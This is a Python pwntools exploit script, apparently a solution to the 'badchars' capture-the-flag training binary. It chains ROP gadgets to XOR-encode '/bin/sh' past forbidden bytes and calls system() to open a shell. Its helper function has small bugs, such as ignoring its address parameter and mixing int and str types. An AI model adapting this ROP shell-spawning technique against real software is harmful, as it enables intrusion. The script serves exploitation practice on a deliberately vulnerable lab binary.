#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./badchars')
# context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['tmux', 'new-window']

host = args.HOST or ''
port = int(args.PORT or 8080)

def local(argv=[], *a, **kw):
    return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(argv, *a, **kw)
    else:
        return local(argv, *a, **kw)

def write(write_addr, string, badchars):
    MOV_R13_R12 = 0x0000000000400b34
    POP_RDI = 0x0000000000400b39
    POP_R12_R13 = 0x0000000000400b3b
    POP_R14_R15 = 0x0000000000400b40
    XOR_R15_R14B = 0x0000000000400b30
    string = string + "\x00"
    chain = ""
    # Pad string to make it a multiple of 8
    if len(string) % 8 != 0:
        string = string + "\x00"*(8 - len(string) % 8)
    # Same as 32 bit version, just 8 bytes at a time
    for i in range(0, len(string), 8):
        target_str = string[i:i+8]
        input_str = ""
        xor_str = ""
        for j in range(8):
            if target_str[j] in badchars:
                char_ok = badchars[0] 
                char_xor = ord(char_ok) ^ ord(target_str[j])
                while char_ok in badchars or char_xor in badchars:
                    char_ok = chr(ord(char_ok) + 1)
                    char_xor = chr(ord(char_ok) ^ ord(target_str[j]))
                input_str += char_ok   
                xor_str += char_xor
            else:
                input_str += target_str[j] 
                xor_str += '\x00'

        # Write the string with the allowed characters
        chain += p64(POP_R12_R13)
        chain += input_str
        chain += p64(WRITE_ADDR+i)
        chain += p64(MOV_R13_R12)

        # Xor each char to get the desired char
        for j in range(8):
            chain += p64(POP_R14_R15)
            chain += xor_str[j] * 8
            chain += p64(WRITE_ADDR+i+j)
            chain += p64(XOR_R15_R14B)

    return chain
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

if args.GEF:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
    ''')
    # pie breakpoint function+118

if args.PWNDBG:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
    ''')
    # piebase 0x7f0

rop = ROP(exe)
WRITE_ADDR = 0x0000000000601274 # in .data (couldn't use base address of data because it contains chars that are not allowed, 0x0a(newline) and 73(s))
SYSTEM_ADDR = exe.sym.system
RET_GADGET = rop.find_gadget(["ret"]).address
POP_RDI = 0x0000000000400b39
badchars = [ 'b', 'i', 'c', '/', '\x20', 'f', 'n', 's', '\x0a', ]
log.info("Write addr %#x" % WRITE_ADDR)

# io.sendline(cyclic(1024))
OFFSET = cyclic_find(0x6161616b)
payload = "A" * OFFSET
payload += write(WRITE_ADDR, "/bin/sh", badchars)

# Put string address in rdi, align the stack, call system
payload += p64(POP_RDI)
payload += p64(WRITE_ADDR)
payload += p64(RET_GADGET)
payload += p64(SYSTEM_ADDR)

io.sendline(payload)

io.interactive()

